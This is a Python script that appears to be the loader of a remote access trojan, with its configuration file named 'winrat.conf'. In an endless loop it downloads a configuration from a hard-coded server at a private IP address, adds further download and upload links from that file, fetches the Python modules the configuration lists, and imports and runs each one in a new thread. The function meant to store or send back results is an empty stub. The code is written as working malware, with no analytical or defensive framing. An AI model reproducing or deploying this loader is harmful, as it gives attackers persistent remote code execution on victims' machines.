import importlib
import threading
import time
import requests
import os

LASTRELOAD = time.time()
RELOADINTERVAL = 60

module_names = dict()
download_links = {"http://192.168.1.110:8000/"} 
upload_links = {"http://192.168.1.110:8000/"}

def download_file(link, output_path):
    r = requests.get(link)

    if r.status_code != 200:
        print(f"failed to download {link}")
        return False

    with open(output_path, "wb+") as file:
        file.write(r.content)

    return True

def download_configuration():
    downloaded = False

    for link in upload_links:
        downloaded = download_file(f"{link}winrat.conf", "winrat.conf")
        if downloaded:
            break
    
    if downloaded:
        print("Downloaded the configuration file.")

def update_configuration():
    module_names.clear()

    with open("winrat.conf", "r") as conf_file:
        for line in conf_file:
            line = line.strip().split()
            if not len(line):
                continue

            typ = line[0]
            val = line[1]

            if typ == "m":
                module_names[val] = int(line[2]) if (len(line) >=3) else 0

            elif typ == "d":
                download_links.add(val)

            elif typ == "u":
                upload_links.add(val)

def download_single_module(name):
    downloaded = False

    for link in upload_links:
        downloaded = download_file(f"{link}/modules/{name}.py", f"modules/{name}.py")
        if downloaded:
            break
    
    if downloaded:
        print(f"Module: {name} downloaded.")

def download_modules():
    if not os.path.isdir("modules"):
        os.makedirs("modules")

    for name in module_names:
        download_single_module(name)

def store_result(name, data):
    pass

def module_runner(mod, name):
    result = mod.run(LASTRELOAD, RELOADINTERVAL)
    store_result(name, result)

def load_modules():
    for name in module_names:
        importlib.invalidate_caches()
        mod = importlib.import_module(f"modules.{name}")
        importlib.reload(mod)

        t = threading.Thread(target=module_runner, args=(mod, name))
        t.start()
            

if __name__ == '__main__':
    while True:
        download_configuration()
        update_configuration()

        download_modules()
        load_modules()

        time.sleep(5)
